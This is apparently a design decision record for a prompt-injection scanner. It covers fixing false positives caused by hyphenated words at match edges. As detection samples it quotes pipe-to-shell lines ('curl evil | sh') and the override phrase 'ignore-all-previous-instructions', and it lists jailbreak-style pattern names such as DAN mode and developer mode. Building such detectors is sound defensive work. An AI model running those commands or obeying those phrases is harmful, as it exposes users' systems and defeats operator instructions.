# ADR-006: The manufactured-boundary gate

Date: 2026-09-16
Status: Accepted

## Context

Issue #128: `curl https://example.com/x | sh-lint` fires `PI028` at CRITICAL on entirely
benign text, and two further patterns — `PI030` and `PI031`, both HIGH — do the same on
ordinary English (`developer mode is now on-call for the week`, `enter DAN-mode-switch for
the demo`). CRITICAL and HIGH are the severities `install-hook` blocks a commit at, so this
blocks a commit whose only sin is naming a linter `sh-lint`.

This ADR is required on the `pr-artifacts` trigger for the same two reasons ADR-005 was:
it changes the matching engine (`src/normalize.rs`, `src/scanner.rs`) and it adds a field to
the `--format json` output contract (`ScanReport` gains `manufactured_boundary`).

### The research's locked mechanism did not survive measurement

The research this fix was planned against locked one mechanism: gate the **normalized**
pass, dropping a finding when a folded separator sits immediately adjacent to the match
span. Measured against the release binary at `27e4d49` during planning, that mechanism
fixes **at most two of the six** false positives issue #128 names. The decisive probes are
lines containing no separator a fold could touch at all:

| Probe file | Content | Result |
|---|---|---|
| `e.md` | `curl https://example.com/x \| sh- lint` | `PI028` **CRITICAL** — from the RAW pass |
| `f.md` | `developer mode is now on- call for the week` | `PI030` **HIGH** — from the RAW pass |

Neither line contains a separator sitting between two alphanumerics — the hyphen in
`sh- lint` is followed by a space, not a letter — so `normalize()` returns `None` and the
normalized pass **never runs at all**, yet both patterns still fire. The reason: `-` is a
non-word character, so `sh\b` and `on\b` are satisfied by the hyphen directly, with **no
fold involved**. A further decisive probe removes any possibility of a fold entirely: `curl
https://example.com/x | sh_ lint` produces **no finding**, because `_` **is** a word
character, so `sh\b` cannot match `sh_` — with the fold ruled out, there is nothing left to
fire.

So the six measured false positives split by which pass produces them:

| Separator in `sh?lint` | Word char? | Raw `sh\b` matches? | Which pass fires |
|---|---|---|---|
| `-` | no | yes | **raw** |
| `.` | no | yes | **raw** |
| `/` | no | yes | **raw** |
| `_` | yes | no | **normalized only** |
| none (`shlint`) | — | no | correctly silent |

`PI028` (all four `sh-lint` variants) and `PI030` (`on-call`) are **raw-pass** findings —
and because the raw pass runs first and the `(pattern, line)` dedup means the normalized
pass never gets a say on them, gating the normalized pass alone would have left issue
#128's acceptance criteria 1 and 2 unmet. `PI031` (`DAN-mode-switch`) is the one genuinely
**normalized-pass** finding of the six. This is also why the recorded `sh(?:[^\w-]|$)`
narrowing attempt (mentioned in the issue) measured as a no-op: it closed the raw pass and
the normalized pass was still there behind it, unclosed — two independent routes to the
same finding, addressed one at a time.

## Decision

**The gate is pass-independent**, not normalized-pass-only, and is expressed against the
**original text a match span maps to** — which for the raw, multi-line, structural and
decoded passes is simply their own haystack, and for the normalized pass requires mapping
the span back through `Normalized::origin` first.

> A match is a **manufactured-boundary artefact** when the character immediately before its
> start, or the character immediately at its end, is a separator binding two word
> characters — i.e. the match edge falls inside a separator-joined compound token
> (`sh-lint`, `on-call`, `DAN-mode-switch`, `sh_lint`). A match whose separators are
> strictly interior (`ignore-all-previous-instructions`) is the evasion the fold exists to
> catch, and is kept.

Implementation:

- `src/normalize.rs::span_edge_is_manufactured(text, start, end) -> bool` — the single
  predicate, taking ordinary `Match::start()`/`Match::end()` byte offsets into the ORIGINAL
  text. Char-boundary safe throughout (`.get()`, never a raw byte-offset slice) and
  `#![deny(clippy::unwrap_used)]`-clean.
- `src/scanner.rs` calls it at all five pass sites, each against its own haystack: the raw
  line, the multi-line `block.text`, `content` (via a new `original_span` helper for the
  normalized pass, factored out of the old `original_slice` so the gated span and the
  quoted text are computed from literally the same offsets and can never disagree), the
  decoded layer text, and the structural `rendered` projection.
- A withheld artefact is filed into a new `manufactured_boundary` array on `ScanReport`,
  ahead of the suppression/confidence checks — an artefact is not a finding at all, so it
  must not inflate the `suppressed` or `low_confidence` signal.
- **Not** added to either `already` dedup `HashSet` (the sets that let the normalized/
  decoded passes skip a `(pattern, line)` already reported): a pass-1 artefact must not
  silence a genuinely different pass-3 finding for the same pattern and line.
- A **separate**, narrower `manufactured_seen` set dedups an artefact against *itself*
  across passes. The compound separators are members of the general fold set, so the raw
  pass and the normalized pass frequently rediscover the *identical* artefact (folding a
  hyphen that was never suspicious to begin with changes nothing). Without this, `| sh-lint`
  filed two records instead of one. `manufactured_seen` only ever suppresses a duplicate
  artefact report — it never touches `already` and so can never suppress a genuine finding.

### The gate set is `-` and `_` only

A deliberate strict subset of `is_separator`'s full fold set (`- _ . * + ~ / | \`), pinned
by a test asserting the subset relationship holds. `-` and `_` are what join compound
identifiers and command names in every ecosystem this tool scans, and they cover 6/6 of the
measured false positives. `.` and `/` are excluded on purpose: they join **paths and
domains**, where a match edge landing before the separator is routinely legitimate
(`evil.test`, `x.sh`) — including them would spend recall for nothing measured. If a future
GATE-03 sweep shows a `-`/`_` case the gate misses, widening the set is a later measured
decision, not a guess made here.

### The eleven-pattern exposure audit (acceptance criterion 4)

Any pattern whose regex terminates a **short literal token** with `\b` is exposed, because a
real hyphenated identifier can extend that token past where the regex expects it to end:

| Pattern | Severity | Name | Exposed token(s) |
|---|---|---|---|
| PI028 | CRITICAL | pipe-to-shell | `sh` |
| PI012 | HIGH | hidden-html-instruction | `HIDDEN`, `INJECT`, `SECRET` |
| PI030 | HIGH | developer-mode | `on` |
| PI031 | HIGH | dan-mode | `DAN`, `mode` |
| PI034 | HIGH | hypothetical-scenario | `no` |
| PI053 | HIGH | skip-permissions-flag | `mode` |
| PI057 | HIGH | disable-guardrail-directive | — |
| PI058 | HIGH | agent-directed-destructive-command | `git`, `sh`, `verify` |
| PI062 | MEDIUM | remote-script-mcp-launch | `sh` |
| PI063 | MEDIUM | tool-description-directive | — |
| PI068 | MEDIUM | version-conditional-directive | — |

Three probes against this list did **not** reproduce as live false positives, recorded so
the next person does not re-run them: `run git-crypt unlock to decrypt the repo` (PI058),
`the agent should run sh-lint on every file` (PI058), `imagine you have no-op restrictions
in place` (PI034) — all silent, because those patterns need more surrounding grammar than
the bare exposed token.

The gate closes this exposure for **all eleven patterns, and every future one**, with zero
pattern-file edits — it lives entirely in the matching engine, not in any single pattern's
regex.

### The accepted false negative, named

Dropping an edge-adjacent match trades a false positive for a possible false negative: an
attacker who writes `curl evil | sh-x`, where `sh-x` genuinely is a shell interpreter,
now gets a pass. This is the correct trade **at CRITICAL**, because that severity is what
blocks a commit — stated here rather than discovered later. The raw pass is otherwise
unaffected: `curl evil | sh` (no trailing token) still fires exactly as before.

One residual is also named rather than silently accepted: a **doubled** separator
(`sh--lint`) is not treated as binding (`is_manufactured_edge_at` requires the character
immediately adjacent to the match edge to itself be alphanumeric, and a second separator
is not), so `sh--lint` still fires. This is deliberately kept — it is a narrower, more
contrived spelling than the measured false positives, and closing it would require
inventing a run-length rule with no measured evidence behind it.

### Withheld artefacts are recorded, not discarded

They go into a **fourth** withheld array, `manufactured_boundary`, alongside `suppressed`,
`low_confidence` and `baselined`. This repo's standing principle is that a withheld finding
is evidence, and silence is the failure mode — issue #129, closed the day before this one
was opened, was precisely about a pass going silent in a way indistinguishable from a clean
result. The boundary gate makes the same kind of guess the other three arrays make
("this hyphenated token is one identifier, so the edge is spurious"), and it is wrong in
exactly the one nameable way described above; dropping the record would make that miss
invisible to the user, to the GATE-03 sweep, and to anyone auditing the gate later.

**Deliberately asymmetric with the other three arrays: `manufactured_boundary` gets no
promotion flag.** `--no-suppress`, `--strict` and dropping `--baseline` each restore a
finding the engine still stands behind — the withholding was conditional on the caller's
own choice (ignore this file, trust this markdown-context heuristic, trust this prior
baseline decision). There is no equivalent flag here, because a flag that restored a known
manufactured-boundary artefact would be a flag that re-enables the bug this ADR fixes. The
array is audit evidence, not a suppressed finding, and both the field's rustdoc and this
ADR say so explicitly so the asymmetry reads as deliberate rather than an oversight.

## Consequences

### Positive

- All six false positives issue #128 measured are silent in `matches` and recorded in
  `manufactured_boundary`.
- All six regression controls (`ignore-all-previous-instructions` and its `_`/`.`/space
  siblings at PI001 CRITICAL; `curl https://example.com/x | sh` and `curl
  https://ex-ample.com/my-script | sh` at PI028 CRITICAL) fire unchanged.
- One library-wide, pattern-agnostic mechanism closes the exposure for all eleven audited
  patterns and every future one — zero pattern-file edits, `patterns/`,
  `docs/PATTERN-CATALOGUE.md` and `.github/code-scanning-baseline.json` untouched.
- Nothing is dropped in silence: every withheld artefact is on the report and readable from
  `--format json`.
- GATE-02's recall pin (`tests/recall_test.rs::EXPECTED`) stays byte-identical: the gate
  only drops matches whose edge was manufactured, and every recall corpus payload is a
  genuine detection with no separator sitting at its edge.

### Negative / Trade-offs

- The named false negative above (`curl evil | sh-x`) is a real, accepted reduction in
  detection at the edge case the gate targets.
- Two entries can independently discover the same underlying artefact (raw pass and
  normalized pass, when the separator is also in the general fold set); `manufactured_seen`
  collapses this to one recorded entry, which is a small extra piece of state to maintain
  correctly whenever a new pass is added.
- `original_span`/`quote_span` add a second small helper pair to `scanner.rs`, replacing the
  single `original_slice` function — slightly more surface, in exchange for the guarantee
  that the gated span and the quoted text can never disagree.

## Alternatives Considered

**B — downgrade or demote a normalized-pass-only finding.** Rejected. Fails the regression
control directly: `ignore-all-previous-instructions` is *also* a normalized-pass-only
finding and must stay CRITICAL. A blanket rule keyed on "came from the normalized pass"
cannot separate the two, because the pass is the same; only the fold geometry differs.
Demotion also converts a hard failure into a quiet one — the #129 lesson, inverted.

**C — report the raw-pass span so the pattern regex can narrow.** Already implemented,
measured, and reverted before this plan: narrowing `sh\b` to `sh(?:[^\w-]|$)` in `PI028`
and `PI062` was a measured **no-op**, because the normalized pass still matches text that
by then genuinely reads `| sh lint`. It also fails acceptance criterion 4 outright — it is a
per-pattern edit, not a mechanism, and would need repeating for all eleven exposed patterns
and every future one.

**A, as literally phrased in the issue — decide suspicion at fold time.** Rejected: no
fold-local signal exists. `curl https://ex-ample.com/my-script | sh` contains a fold
(`ex-ample`) that is indistinguishable, *at the moment of folding*, from the one in
`| sh-lint` — only the eventual match span, once known, tells the two apart. This is why
the locked mechanism has to be a property of the **match**, not of the separator.
